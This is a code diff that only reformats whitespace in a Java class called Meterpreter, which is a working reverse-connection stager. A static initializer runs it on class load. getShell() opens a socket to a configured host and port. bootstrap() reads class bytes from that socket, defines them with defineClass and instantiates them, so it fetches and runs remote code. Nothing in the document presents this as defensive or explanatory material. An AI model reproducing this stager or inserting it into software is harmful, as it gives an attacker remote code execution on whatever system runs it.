@@ -11,9 +11,9 @@ import java.util.HashMap;
 public class Meterpreter
         extends ClassLoader
         implements Runnable {
-    static /* synthetic */ Class  class$0;
-    static /* synthetic */ Class  class$1;
-    static /* synthetic */ Class  class$2;
+    static /* synthetic */ Class class$0;
+    static /* synthetic */ Class class$1;
+    static /* synthetic */ Class class$2;
 
     static {
 
@@ -22,8 +22,8 @@ public class Meterpreter
         meterpreter.run();
     }
 
-    public                 String host;
-    public                 String port;
+    public String host;
+    public String port;
     private HashMap parameterMap;
 
     public static void main(String[] args) {
@@ -60,11 +60,11 @@ public class Meterpreter
     }
 
     public void getShell() throws Exception {
-        InputStream  inputStream1 = null;
+        InputStream inputStream1 = null;
         OutputStream outputStream = null;
-        int          j            = new Integer(this.port);
-        String       str4         = this.host;
-        Socket       socket       = null;
+        int j = new Integer(this.port);
+        String str4 = this.host;
+        Socket socket = null;
         if (str4 != null) {
             socket = new Socket(str4, j);
         }
@@ -75,18 +75,18 @@ public class Meterpreter
 
     private final void bootstrap(InputStream paramInputStream, OutputStream paramOutputStream) throws Exception {
         try {
-            Class<?>        clazz;
+            Class<?> clazz;
             DataInputStream dataInputStream = new DataInputStream(paramInputStream);
-            int             i               = dataInputStream.readInt();
+            int i = dataInputStream.readInt();
             do {
                 byte[] arrayOfByte = new byte[i];
                 dataInputStream.readFully(arrayOfByte);
                 clazz = this.defineClass(null, arrayOfByte, 0, i);
                 this.resolveClass(clazz);
             } while ((i = dataInputStream.readInt()) > 0);
-            Object   object     = clazz.newInstance();
-            Class[]  classArray = new Class[3];
-            Class<?> clazz2     = class$0;
+            Object object = clazz.newInstance();
+            Class[] classArray = new Class[3];
+            Class<?> clazz2 = class$0;
             if (clazz2 == null) {
                 try {
                     clazz2 = class$0 = Class.forName("java.io.DataInputStream");
